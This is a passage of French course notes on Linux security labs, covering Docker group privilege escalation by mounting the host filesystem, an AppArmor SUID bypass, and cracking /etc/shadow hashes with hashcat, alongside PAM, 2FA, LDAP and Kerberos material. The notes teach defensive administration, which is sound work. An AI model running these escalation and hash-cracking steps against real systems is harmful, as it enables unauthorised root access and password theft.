<pre><code>docker run hello-world</code></pre>
                    <p>En résumé, cette commande lance un conteneur de test pour vérifier que Docker fonctionne.</p>
<pre><code>su user2</code></pre>
<pre><code>docker run hello-world</code></pre>
<pre><code>ls -la /var/run/docker.sock</code></pre>
                    <p>En résumé, cette commande affiche les permissions du socket Docker.</p>
<pre><code>exit</code></pre>
                    <p>En résumé, cette commande quitte la session <span class="em">user2</span> et retourne à l'utilisateur précédent (souvent root ou vagrant).</p>
<pre><code>docker run --rm -v /:/host -t -i debian bash</code></pre>
                    <p>En résumé, cette commande donne au conteneur un accès <span class="em">direct au système de fichiers de l'hôte</span>.</p>
                    <ul>
                        <li>
                            <p><span class="em">--rm</span> : supprime le conteneur après arrêt.</p>
                        </li>
                        <li>
                            <p><span class="em">-v /:/host</span> monte <span class="em">la racine de l'hôte</span> dans le conteneur.</p>
                        </li>
                        <li>
                            <p><span class="em">debian shell</span> : shell interactif.</p>
                        </li>
                    </ul>
<pre><code>cat /host/etc/shadow | grep user</code></pre>
                    <h3>MAC - exemple Apparmor :</h3>
                    <img src="../images/MAC_exemple_Apparmor.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo aa-enforce ./welcome</code></pre>
                    <p>En résumé, cette commande met le programme <span class="em">welcome</span> <span class="em">en mode enforce AppArmor</span>.</p>
<pre><code>sudo cat /etc/apparmor.d/EPHEC.test-suid.welcome</code></pre>
                    <p>En résumé, cette commande affiche le <span class="em">profil AppArmor</span> appliqué à <span class="em">welcome</span>.</p>
<pre><code>#include &lt;tunables/global&gt;
/EPHEC/test-suid/welcome {
  #include &lt;abstractions/base&gt;

  deny capability setuid,

  /EPHEC/test-suid/greetings mrix,
  /EPHEC/test-suid/welcome mr,
  /bin/bash mrix,
  /usr/bin/id mrix,
}</code></pre>
<pre><code>cp greetings2 greetings</code></pre>
<pre><code>./welcome</code></pre>
<pre><code>cat 1&gt; greetings -</code></pre>
<pre><code>#!/bin/bash
ls</code></pre>
<pre><code>./greetings</code></pre>
<pre><code>./welcolme</code></pre>
                    <p>AppArmor permet de restreindre finement les actions d'un binaire SUID, mais une mauvaise définition des chemins autorisés peut permettre l'exécution de code arbitraire.</p>
                </article>
                <article>
                    <h2 id="gestion_utilisateurs">Gestion des utilisateurs :</h2>
                    <h3>Le fichier des utilisateurs : /etc/passwd :</h3>
                    <img src="../images/etc_passwd.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo head -n 1 /etc/passwd</code></pre>
                    <p>En résumé, cette commande affiche la première entrée du fichier <span class="em">/etc/passwd</span> pour montrer le format d'un compte utilisateur.</p>
<pre><code>sudo tail -n 10 /etc/passwd</code></pre>
                    <p>En résumé, cette commande affiche les dix derniers comptes utilisateurs définis sur le système.</p>
                    <h4>/etc/passwd - informations détaillées :</h4>
                    <ul>
                        <li>
                            <p>Username : purement conventionnel (peut être changé).</p>
                        </li>
                        <li>
                            <p>(hash du password - historique).</p>
                        </li>
                        <li>
                            <p>UID : identifiant numérique de l'utilisateur - coeur de l'identification.</p>
                        </li>
                        <li>
                            <p>GID : identifiant numérique du groupe - coeur de l'identification.</p>
                        </li>
                        <li>
                            <p>Informations administratives - peuvent être modifiées (limite sur Full Name).</p>
                        </li>
                        <li>
                            <p>Home directory - pas toujours présent.</p>
                        </li>
                        <li>
                            <p>Shell - pas toujours présent.</p>
                        </li>
                    </ul>
                    <h3>Utilisateurs techniques, utilisateurs avec id=0 :</h3>
                    <h4>Utilisateurs techniques (typiquement id inférieur à 1000) :</h4>
                    <p>Typiquement, pour limiter l'accès aux ressources pour un programme spécifique, sans passer par root.</p>
                    <h4>Utilisateurs avec id=0 :</h4>
                    <ul>
                        <li>
                            <p>Pouvoirs root.</p>
                        </li>
                        <li>
                            <p>Peuvent être multiples.</p>
                        </li>
                        <li>
                            <p>Peuvent ne pas s'appeler root.</p>
                        </li>
                        <li>
                            <p>... danger pour la sécurité ...</p>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="authentification">Authentification :</h2>
                    <h3>Authentification via mots de passe : /etc/shadow :</h3>
                    <p>Le fichier <span class="em">/etc/shadow</span> contient le hash du mot de passe, le salt, l'algorithme et les informations de validité.</p>
                    <img src="../images/etc_shadow.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo head -n 1 /etc/shadow</code></pre>
                    <p>En résumé, cette commande affiche la première ligne du fichier contenant les mots de passe chiffrés.</p>
<pre><code>sudo tail -n 10 /etc/shadow | fold -w 80 -s</code></pre>
                    <p>En résumé, cette commande affiche les dernières entrées du fichier <span class="em">/etc/shadow</span> en repliant les lignes pour une meilleur lisibilité. L'option <span class="em">-fold</span> sert à <span class="em">casser les lignes trop longues</span>. L'option <span class="em">-w 80</span> permet une largeur maximale de ligne de <span class="em">80 caractères</span>. L'option <span class="em">-s</span> coupe <span class="em">proprement aux espaces</span> (si possible), pas au milieu d'un mot.</p>
                    <h4>/etc/shadow - informations détaillées :</h4>
                    <ul>
                        <li>
                            <p>user.</p>
                        </li>
                        <li>
                            <p>hash :</p>
                            <ul>
                                <li>
                                    <p>version</p>
                                    <ul>
                                        <li>
                                            <p><span class="em">$6$</span> &#8594; SHA-512</p>
                                        </li>
                                        <li>
                                            <p><span class="em">$5$</span> &#8594; SHA-256.</p>
                                        </li>
                                        <li>
                                            <p><span class="em">$1$</span> &#8594; MD5.</p>
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    <p>salt = valeur aléatoire ajoutée avant le hash.</p>
                                </li>
                                <li>
                                    <p>hash proprement dit.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>diverses informations relatives au mot de passe (dernier changement, etc.).</p>
                            <ul>
                                <li>
                                    <p>Nombre de jours depuis le 1er janvier 1970 correspondant à la date de la dernière modification.</p>
                                </li>
                                <li>
                                    <p>Nombre minimum de jours avant de pouvoir changer le mot de passe.</p>
                                </li>
                                <li>
                                    <p>Nombre maximum de jours avant expiration.</p>
                                </li>
                                <li>
                                    <p>Nombre de jours d'avertissement avant expiration.</p>
                                </li>
                                <li>
                                    <p>Champ inactivité.</p>
                                </li>
                                <li>
                                    <p>Date d'expiration du compte.</p>
                                </li>
                                <li>
                                    <p>Champ réservé.</p>
                                </li>
                            </ul>
                        </li>
                    </ul>
                    <h3>Importance de mots de passe compliqués : illustration :</h3>
                    <p>Hashcat - <a href="https://hashcat.net/hashcat/" target="_blank">https://hashcat.net/hashcat/</a> - <a href="https://github.com/danielmiessler/SecLists/tree/master" target="_blank">https://github.com/danielmiessler/SecLists/tree/master</a></p>
                    <img src="../images/importance_passwords_compliques_illustration_1.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/shadow | grep weak_pass_user</code></pre>
                    <p>En résumé, cette commande extrait l'entrée correspondant à l'utilisateur ciblé dans <span class="em">/etc/shadow</span>.</p>
<pre><code>sudo cat /etc/shadow | grep weak_pass_user &gt; hash1.temp</code></pre>
<pre><code>cut --delimiter=: --fields=2 hash1.temp</code></pre>
                    <p>En résumé, cette commande extrait uniquement le champ contenant le hash du mot de passe.</p>
<pre><code>cut --delimiter=: --fields=2 hash1.temp &gt; hash1.txt</code></pre>
<pre><code>cat hash1.txt</code></pre>
<pre><code>hashcat --force -m 1800 -a 0 hash1.txt rockyou.txt</code></pre>
                    <p>En résumé, cette commande lance une attaque par dictionnaire sur un hash SHA-512 pour démontrer la faiblesse d'un mot de passe.</p>
<pre><code>hashcat --force --show -m 1800 -a 0 hash1.txt rockyou.txt | fold -w 80 -s</code></pre>
                    <img src="../images/importance_passwords_compliques_illustration_2.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/shadow | grep weak_pass:</code></pre>
<pre><code>sudo cat /etc/shadow | grep weak_pass: &gt; hash2.temp</code></pre>
<pre><code>cut --delimiter=: --fields=2 hash2.temp</code></pre>
<pre><code>cut --delimiter=: --fields=2 hash2.temp &gt; hash2.txt</code></pre>
<pre><code>hashcat --force -m 1800 -a 0 hash2.txt rockyou.txt</code></pre>
                    <h3>Gestion des logins - par exemple la rotation des mots de passe :</h3>
                    <p><a href="https://www.baeldung.com/linux/password-complexity" target="_blank">https://www.baeldung.com/linux/password-complexity</a></p>
                    <img src="../images/gestion_logins_rotation_passwords.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>cat /etc/login.defs</code></pre>
                    <p>En résumé, cette commande affiche la configuration globale des règles de gestion des mots de passe.</p>
<pre><code>sudo chage user_reasonable_password</code></pre>
                    <p>En résumé, cette commande permet de configurer l'expiration et la rotation du mot de passe d'un utilisateur.</p>
<pre><code>su user_reasonable_password</code></pre>
                    <h4>Désactivation &amp; réactivation d'un compte :</h4>
                    <img src="../images/gestion_logins.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo usermod -L -e 1 user_reasonable_password</code></pre>
                    <p>En résumé, cette commande verouille le compte et force son expiration immédiate.</p>
<pre><code>su user_reasonable_password</code></pre>
<pre><code>sudo usermod -U -e "" user_reasonable_password</code></pre>
                    <p>En résumé, cette commande déverouille le compte et supprime la date d'expiration.</p>
<pre><code>su user_reasonable_password</code></pre>
                    <h3>Centralisation authentification via Pluggable Authentication Module (PAM) :</h3>
                    <p>login, passwd, sudo, etc. : répétition du code ?</p>
                    <h4>Pluggable Authentication Module - centralisation logique :</h4>
                    <ul>
                        <li>
                            <p>auth : identification des utilisateurs.</p>
                        </li>
                        <li>
                            <p>account : limitation du nombre d'utilisateurs simultanés, etc.</p>
                        </li>
                        <li>
                            <p>sessions : actions à faire au début et à la fin d'une session.</p>
                        </li>
                        <li>
                            <p>password : complexité risque, type de hashage, etc.</p>
                        </li>
                    </ul>
                    <h3>Gestion de la complexité des mots de passe via PAM :</h3>
                    <p><a href="https://www.baeldung.com/linux/password-complexity" target="_blank">https://www.baeldung.com/linux/password-complexity</a></p>
                    <img src="../images/gestion_complexite_passwords_PAM.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>cat /etc/pam.d/common-password</code></pre>
<pre><code>su user_reasonable_password</code></pre>
<pre><code>passwd</code></pre>
                    <h4>Gestion de la complexité du hashage des mots de passe via PAM :</h4>
                    <img src="../images/gestion_complexite_hashage_passwords_PAM_1.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/pam.d/common-password | grep -v "#"</code></pre>
                    <p>En résumé, cette commande affiche uniquement les règles PAM actives liées aux mots de passe.</p>
<pre><code>sudo tail -n 1 /etc/shadow | fold -w 80 -s</code></pre>
                    <img src="../images/gestion_complexite_hashage_passwords_PAM_2.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>sudo cat /etc/pam.d/common-password | grep -v "#"</code></pre>
<pre><code>sudo tail -n 2 /etc/shadow | fold -w 80 -s</code></pre>
                    <p>La différence principale (en dehors de la version d'Ubuntu) concerne <span class="em">l'algorithme de hachage des mots de passe utilisé par PAM et stocké dans /etc/shadow</span>. Dans Ubuntu 18.04, le hash commence par <span class="em">$6$</span> (SHA-512) alors que, dans Ubuntu 22.04, le hash commence par <span class="em">$y$</span> (yescrypt).</p>
                    <h3>Implémentation 2FA via PAM :</h3>
                    <p><a href="https://www.digitalocean.com/community/tutorials/how-to-configure-multi-factor-authentication-on-ubuntu-18-04" target="_blank">https://www.digitalocean.com/community/tutorials/how-to-configure-multi-factor-authentication-on-ubuntu-18-04</a></p>
                    <img src="../images/implementation_2FA_PAM_1.PNG" alt="">
                    <img src="../images/implementation_2FA_PAM_2.PNG" alt="">
                    <p>Il faut ajouter l'utilisateur <span class="em">user_2fa</span> avec la commande suivante :</p>
<pre><code>sudo adduser user_2fa</code></pre>
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>google-authenticator</code></pre>
                    <p>En résumé, cette commande initialise l'authentification à deux facteurs pour un utilisateur.</p>
<pre><code>tail -n 1 /etc/pam.d/common-auth</code></pre>
<pre><code>su user_2fa</code></pre>
                </article>
                <article>
                    <h2 id="exercices">Exercices :</h2>
                    <h3>Contexte :</h3>
                    <ol>
                        <li>
                            <p>Contexte d'entreprise :</p>
                            <ul>
                                <li>
                                    <p>Sites Web d'organisation hostés sur un serveur commun.</p>
                                </li>
                                <li>
                                    <p>Sites "statiques", plusieurs utilisateurs autorisés à modifier le contenu de leur(s) site(s).</p>
                                </li>
                                <li>
                                    <p>Nécessité de pouvoir mettre à jour le contenu &amp; la configuration.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Actifs à protéger :</p>
                            <ul>
                                <li>
                                    <p>Contenu très important pour réputation.</p>
                                </li>
                                <li>
                                    <p>Réelle menace de piratage du contenu, ou de le rendre indisponible.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h3>Configuration :</h3>
                    <ul>
                        <li>
                            <p>Box Vagrant préconfigurée avec un serveur web.</p>
                        </li>
                        <li>
                            <p>Fichiers de configuration pour le serveur web dans /etc/nginx/conf.d :</p>
                            <ul>
                                <li>
                                    <p>client1.conf : premier site sur port 8081</p>
                                </li>
                                <li>
                                    <p>client2.conf : premier site sur port 8082</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Sites dans /var/www/site-client1 et /var/www/site-client2 :</p>
                            <ul>
                                <li>
                                    <p>/var/www/site-client1/index.html</p>
                                </li>
                                <li>
                                    <p>/var/www/site-client2/index.html</p>
                                </li>
                            </ul>
                        </li>
                    </ul>
                    <h3>Tâches :</h3>
                    <h4>Gestion des accès :</h4>
                    <ul>
                        <li>
                            <p>Vérifier qu'un quidam peut bien avoir accès aux deux sites (tuyau : <span class="em">curl</span>).</p>
<pre><code>curl http://localhost:8081</code></pre>
<pre><code>curl http://localost:8082</code></pre>
                        </li>
                        <li>
                            <p>Identifier les utilisateurs (<span class="em">user*</span>) et les groupes (<span class="em">client*</span>) (tuyau : <span class="em">/etc/passwd</span>, <span class="em">/etc/group</span>, <span class="em">/etc/shadow</span>).</p>
                            <ul>
                                <li>
                                    <p><span class="em">/etc/passwd</span> &#8594; utilisateurs.</p>
<pre><code>sudo cat /etc/passwd</code></pre>
                                </li>
                                <li>
                                    <p><span class="em">/etc/group</span> &#8594; groupes.</p>
<pre><code>sudo cat /etc/group</code></pre>
                                </li>
                                <li>
                                    <p><span class="em">/etc/shadow</span> &#8594; authentification.</p>
<pre><code>sudo cat /etc/shadow</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Tester le changement du contenu de site-client1 - sans utiliser sudo (!) (tuyau : un utilisateur dans le bon "groupe").</p>
                            <ul>
                                <li>
                                    <p>Vérifier le <span class="em">groupe propriétaire</span> du répertoire.</p>
<pre><code>ls -la /var/www/site-client1</code></pre>
                                </li>
                                <li>
                                    <p>Ajouter l'utilisateur au groupe :</p>
<pre><code>sudo usermod -aG client1 userX</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Vérifier qu'un utilisateur non-autorisé ne peut pas changer le contenu de site-client1 (tuyau : voir "groupes").</p>
                            <ul>
                                <li>
                                    <p>Vérifier les permissions :</p>
<pre><code>ls -ld /var/www/site-client1</code></pre>
                                </li>
                                <li>
                                    <p>Vérifierles groupes :</p>
<pre><code>groups userX</code></pre>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>Changer le port d'écoute de site-client2 en 8083 (tuyau : bien voir qui peut faire cette modification et à quelle condition - redémarrer le serveur avec <span class="em">sudo nginx -t</span> suivi de <span class="em">sudo nginx -s reload</span>).</p>
<pre><code>sudo nano /etc/nginx/conf.d/client2.conf</code></pre>
<pre><code>sudo nginx -t</code></pre>
<pre><code>sudo nginx -s reload</code></pre>
                        </li>
                    </ul>
                    <h4>Gestion du cycle de vie des identités &amp; des "credentials" :</h4>
                    <ul>
                        <li>
                            <p>Faire un "audit" des utilisateurs (qui a accès à quoi) - tous les utilisateurs listés sont-ils nécessaires ? (tuyau : ne pas oublier les utilisateurs privilégiés).</p>
<pre><code>awk -F: '$3 &gt;= 1000 {print $1}' /etc/passwd</code></pre>
                            <p>L'audit des utilisateurs vise à :</p>
                            <ul>
                                <li>
                                    <p>Identifier tous les comptes présents sur le système.</p>
                                </li>
                                <li>
                                    <p>Déterminer leurs niveaux de privilèges.</p>
                                </li>
                                <li>
                                    <p>Vérifier la légitimité et la nécessité de chaque compte.</p>
                                </li>
                                <li>
                                    <p>Réduire la surface d'attaque en appliquant le principe du moindre privilège.</p>
                                </li>
                            </ul>
                            <p>Les comptes sont listés dans le fichier <span class="em">/etc/passwd</span>. On distingue deux catégories : comptes techniques (UID &lt; 1000) et comptes utilisateurs (UID &gt;= 1000).</p>
                            <p>L'audit doit impérativement inclure la vérification du droits d'administration.</p>
                            <p>L'utilisateur <span class="em">www-data</span> est un compte technique utilisé par les serveurs web (Apache, Nginx). Il permet l'exécution des services web avec des privilèges restreints.</p>
                            <p>L'utilisateur <span class="em">ubuntu</span> est un compte par défaut des images cloud Ubuntu et souvent membre du groupe <span class="em">sudo</span>. Il sert généralement de compte administrateur initial.</p>
<pre><code>sudo su -</code></pre>
                            <p>En résumé, cette commande ouvre une session complète en tant que <span class="em">root</span>. Elle permet d'accéder aux fichiers protégés, d'inspecter la configuration système complète et de vérifier les privilèges effectifs. Elle doit être utilisée avec précaution dans un contexte de sécurité.</p>
                            <p>Le répertoire <span class="em">/etc/sudoers.d/</span> peut contenir des règles supplémentaires accordant des privilèges spécifiques à certains utilisateurs.</p>
                            <p>Sur les machines issues d'images cloud (AWS, Azure, etc.), on trouve souvent le fichier <span class="em">/etc/sudoers.d/90-cloud-init-users</span>. Ce fichier est généré par <span class="em">cloud-init</span> et peut contenur une règle telle que :</p>
<pre><code>ubuntu ALL=(ALL) NOPASSWD:ALL</code></pre>
                            <p>En résumé, cela signique que l'utilisateur <span class="em">ubuntu</span> peut exécuter toutes les commandes en tant que n'importe quel utilisateur sans devoir saisir de mot de passe. Ceci constitue un privilège administratif complet.</p>
                        </li>
                        <li>
                            <p>Lors d'un contrôle périodique, vous constatez que user1 ne doit plus être autorisé à modifier son site - désactiver son compte (tuyau : voir <span class="em">sudo usermod</span>) - Vérifier qu'il n'a effectivement plus accès.</p>
<pre><code>sudo usermod -L user1</code></pre>
                        </li>
                        <li>
                            <p>Un nouvel utilisateur user1b doit pouvoir modifier site-client1. Faire en sorte qu'il puisse le faire (tuyau : ne pas oublier le groupe).</p>
<pre><code>sudo adduser user1b</code></pre>
<pre><code>sudo usermod -aG client1 user1b</code></pre>
                            <p>Sous Ubuntu, deux commandes permettent de créer des comptes utilisateurs : <span class="em">useradd</span> et <span class="em">adduser</span>. Bien qu'elles poursuivent le même objectif, leur nature et leur fonctionnement diffèrent.</p>
                            <table class="tableBalises">
                                <thead>
                                    <tr>
                                        <th>Critère</th>
                                        <th>useradd</th>
                                        <td>adduser</td>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>Niveau</td>
                                        <td>Bas niveau</td>
                                        <d>Haut niveau</d>
                                    </tr>
                                    <tr>
                                        <td>Interaction</td>
                                        <td>Non interactive</td>
                                        <td>Interactive</td>
                                    </tr>
                                    <tr>
                                        <td>Création du home directory</td>
                                        <td>Optionnelle</td>
                                        <td>Automatique</td>
                                    </tr>
                                    <tr>
                                        <td>Portabilité</td>
                                        <td>Toutes distributions</td>
                                        <td>Debian/Ubuntu</td>
                                    </tr>
                                    <tr>
                                        <td>Usage recommandé</td>
                                        <td>Scripts</td>
                                        <td>Administration courante</td>
                                    </tr>
                                </tbody>
                            </table>
                        </li>
                        <li>
                            <p>Vous décidez que vous voulez implémenter la règle d'entreprise qui dit que les mots de passe doivent être changés régulièrement. Modifier la configuration de user2 pour que son mot de passe expire après 7 jours et forcez la date de dernière mise à jour du mot de pa1sse à un jour en septembre (tuyau : <span class="em">sudo chage</span>). Vérifier qu'il doit effectivement donner un nouveau mot de passe.</p>
<pre><code>sudo chage -M 7 -d 2023-01-01 user2</code></pre>
                        </li>
                        <li>
                            <p>Comment vous-y prenez vous pour organiser et exécuter la tâche de vérification des identités et des "credentials" (tuyau : penser plan-do-check-act).</p>
                        </li>
                    </ul>
                    <h4>Bonus : création d'un troisième site web :</h4>
                    <ul>
                        <li>
                            <p>Créer éventuellement un nouveau groupe et un nouvel utilisateur.</p>
                        </li>
                        <li>
                            <p>Créer un nouveau fichier de configuration dans <span class="em">/etc/nginx/conf.d</span> (tuyau : utiliser un port non utilisé - qui peut faire cette opération et à quelle condition ?).</p>
                        </li>
                        <li>
                            <p>Créer un nouveau directory dans <span class="em">/var/www/</span> (tuyau : peser à changer le groupe et changer les droits en 2775 - qui peut faire cette opération et à quelle condition ?).</p>
                        </li>
                        <li>
                            <p>Créer un nouveau fichier <span class="em">index.html</span> dans le directory nouvellement créé.</p>
                        </li>
                        <li>
                            <p>Vérifier que tout fonctionne bien (tuyau : penser à redémarrer le serveur).</p>
                        </li>
                        <li>
                            <p>Donner des droits "sudo" à user_adm et vérifier qu'il peut effectuer des tâches administratives relatives aux sites.</p>
<pre><code>sudo usermod -aG sudo user_adm</code></pre>
                        </li>
                    </ul>
                </article>
                <article>
                    <h2 id="environnement_travail">Environnement de travail :</h2>
                    <h3>Boîtes à démarrer dans l'ordre :</h3>
                    <ol>
                        <li>
                            <h4>Boîte network-identity-server (sso-server.hs.be) :</h4>
                            <ul>
                                <li>
                                    <p>Serveur d'identité.</p>
                                </li>
                                <li>
                                    <p>Serveur d'authentification (tiers de confiance).</p>
                                </li>
                                <li>
                                    <p>Initialisée avec un utilisateur.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Boîte network-identity-service (sso-service.hs.be) :</h4>
                            <ul>
                                <li>
                                    <p>Se réfère à sso-server.hs.be pour l'obtention des informations d'identité et d'authentification.</p>
                                </li>
                                <li>
                                    <p>Est enregistré en tant que machine auprès du serveur d'identité / d'authentification.</p>
                                </li>
                                <li>
                                    <p>Expose un service SSH configuré pour utiliser les services réseau d'authentification et d'authentification.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Boîte network-identity-client (sso-client.hs.be) :</h4>
                            <ul>
                                <li>
                                    <p>Se réfère à sso-server.hs.be pour l'obtention des informations d'identité et d'authentification.</p>
                                </li>
                                <li>
                                    <p>Contacte sso-service.hs.be en SSH sans devoir se réauthentifier (single sign on).</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="notions">Notions :</h2>
                    <h3>Notion &amp; Motivation :</h3>
                    <ol>
                        <li>
                            <h4>Notion :</h4>
                            <ul>
                                <li>
                                    <p>Mêmes utilisateurs/'credentials' sur toutes les machines du réseau.</p>
                                </li>
                                <li>
                                    <p>(Single Sign On - SSO) Ne s'identifier/s'authentifier qu'une seule fois pour une période de temps.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Motivations Administrateur / Responsable Sécurité :</h4>
                            <ul>
                                <li>
                                    <p>Gestion intégrée des utilisateurs et des droits, notamment utilisateurs avec accès privilégié (sudo).</p>
                                </li>
                                <li>
                                    <p>Politique mots de passe etc. unifiée...</p>
                                </li>
                                <li>
                                    <p>... mais point de faiblesse unique si compte compromis.</p>
                                </li>
                                <li>
                                    <p>(SSO) Centraliser au niveau du réseau l'authentification - pas de compromission des mots de passe si un service est compromis.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Motivation Utilisateurs :</h4>
                            <ul>
                                <li>
                                    <p>Exigence de mots de passe forts plus supportable.</p>
                                </li>
                                <li>
                                    <p>(SSO) Facilité d'utilisation.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                    <h3>Composants :</h3>
                    <ol>
                        <li>
                            <h4>Interface client :</h4>
                            <ul>
                                <li>
                                    <p>sswitch &amp; Pluggable Authentication Module (PAM - Encore lui !) - où trouver l'info &amp; configurer l'authentification.</p>
                                </li>
                                <li>
                                    <p>System Security Services Daemon (SSSD) - tâche de fond.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Gestion centralisée de l'identité :</h4>
                            <ul>
                                <li>
                                    <p>Le plus souvent, Lightweight Directory Access Protocol (LDAP).</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <h4>Gestion centralisée de l'authentification :</h4>
                            <ul>
                                <li>
                                    <p>Directement sur le serveur d'identité LDAP - pas de SSO.</p>
                                </li>
                                <li>
                                    <p>Avec Kerberos - nécessaire pour SSO.</p>
                                </li>
                            </ul>
                        </li>
                    </ol>
                </article>
                <article>
                    <h2 id="serveur_identite_eventuellement_authentification">Serveur d'identité (et éventuellement d'authentification) :</h2>
                    <h3>LDAP :</h3>
                    <ul>
                        <li>
                            <p>Un protocole pour accéder à un annuaire via TCP/IP.</p>
                        </li>
                        <li>
                            <p>Annuaire peut être général, mais en pratique bien adapté pour données d'identité et d'authentification.</p>
                        </li>
                        <li>
                            <p>Accès idéalement sécurisé via TLS (certainement si Authentification).</p>
                        </li>
                    </ul>
                    <img src="../images/serveur_identite_eventuellement_authentification.PNG" alt="">
                    <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>ldapsearch -x -LLL -b dc=hs,dc=be '(uid=john)'</code></pre>
<pre><code>ldapsearch -x -LLL -b dc=hs,dc=be '(cn=john)'</code></pre>
                    <p>En résumé, <span class="em">ldapsearch</span> est un outil pour interroger un annuaire LDAP. <span class="em">-x</span> utilise l'authentification simple, <span class="em">-LLL</span> produit une sortie épurée, <span class="em">-b dc=hs,dc=be</span> définit la base DN, et <span class="em">'(uid=john)'</span> ou <span class="em">'(cn=john)'</span> est le filtre de recherche.</p>
                </article>
                <article>
                    <h2 id="authentification_reseau_SSO">Authentification réseau - Single Sign On :</h2>
                    <h3>Kerberos - authentification via tiers de confiance et "session keys" :</h3>
                    <figure>
                        <img src="../images/Kerberos.svg.png" alt="">
                        <figcaption>Source : <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.png" target="_blank">https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.pnghttps://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Kerberos.svg/1200px-Kerberos.svg.png</a></figcaption>
                    </figure>
                    <h3>Principes de fonctionnement :</h3>
                    <h4>Tiers de confiance :</h4>
                    <ul>
                        <li>
                            <p>Authentification préalable des utilisateurs (et des services !) auprès d'un tiers de confiance.</p>
                        </li>
                    </ul>
                    <h4>Échanges utilisateur - serveur - version simplifiée(!) :</h4>
                    <ol>
                        <li>
                            <p>L'utilisateur reçoit du tiers de confiance :</p>
                            <ul>
                                <li>
                                    <p>un secret ("session key") encrypté avec le mot de passe de l'utilisateur.</p>
                                </li>
                                <li>
                                    <p>un "ticket" qui contient le secret, encrypté avec le mot de passe du service.</p>
                                </li>
                            </ul>
                        </li>
                        <li>
                            <p>L'utilisateur décrypte le secret.</p>
                        </li>
                        <li>
                            <p>L'utilisateur encrypte une requête contenant un "timestamp" encrypté avec le secret et l'envoie au service, en même temps que le "ticket".</p>
                        </li>
                        <li>
                            <p>Le service décrypte le ticket, avec son propre mot de passe, et utilise le secret pour décrypter la demande de l'utilisateur.</p>
                        </li>
                        <li>
                            <p>Seul un utilisateur valide peut produire une requête valide - il doit avoir une connaissance du secret commun entre lui et le service.</p>
                        </li>
                        <li>
                            <p>... à aucun moment le mot de passe n'est échangé en clair.</p>
                        </li>
                        <li>
                            <p>... à aucun moment le service n'a connaissance du vrai mot de passe de l'utilisateur !</p>
                        </li>
                        <li>
                            <p>Le secret et ticket n'ont qu'une durée de vie limitée.</p>
                        </li>
                    </ol>
                    <h4>Single Sign On :</h4>
                    <ol>
                        <li>
                            <p>Le secret initial peut servir comme "credential" entre l'utilisateur et un service spécial et centralisé qui crée des "sous-secrets et sous-tickets".</p>
                        </li>
                        <li>
                            <p>Ces "sous-secrets et sous-tickets" sont utilisés par l'utilisateur pour accéder à d'autres services, sans redonner son mot de passe - single sign on !</p>
                        </li>
                        <li>
                            <p>Le secret initial a de toute façon une durée de vie limitée.</p>
                        </li>
                    </ol>
                    <p>Très bonne explication : <a href="https://wpollock.com/AUnixSec/MoronsGuideToKerberos.htm" target="_blank">https://wpollock.com/AUnixSec/MoronsGuideToKerberos.htm</a></p>
                </article>
                <article>
                    <h2 id="configuration_clients">Configuration des clients :</h2>
                    <h3>Configuration nsswitch &amp; PAM du client (voir Vagrant pour sources) :</h3>
                    <ul>
                        <li>
                            <h4>Configuration nsswitch - où trouver l'information :</h4>
                            <img src="../images/configuration_nsswitch.PNG" alt="">
<pre><code>cat /etc/nsswitch.conf</code></pre>
                            <p>En résumé, cette commande affiche le fichier <span class="em">nsswitch.conf</span>, qui définit comment le système résout les utilisateurs et groupes (fichiers locaux, LDAP, etc.).</p>
                        </li>
                        <li>
                            <h4>Configuration de Pluggable Authentication Module - gestion authentification :</h4>
                            <img src="../images/configuration_PAM.PNG" alt="">
                            <p>Voici les différentes commandes exécutées dans l'image précédente :</p>
<pre><code>cd /etc/pam.d</code></pre>
                            <p>En résumé, cette commande accède aux fichiers de configuration PAM.</p>
<pre><code>grep -r sss</code></pre>
                            <p>En résumé, cette commande recherche l'utilisation de SSSD pour l'authentification.</p>
                        </li>
                    </ul>
                    <h3>Configuration sssd du client :</h3>
                    <ul>
                        <li>
                            <h4>Pour mémoire :</h4>
                            <ul>
                                <li>
                                    <p>Résolution de nom de domaine (ici route statique vers ss-server.hs.be).</p>
                                </li>
                                <li>
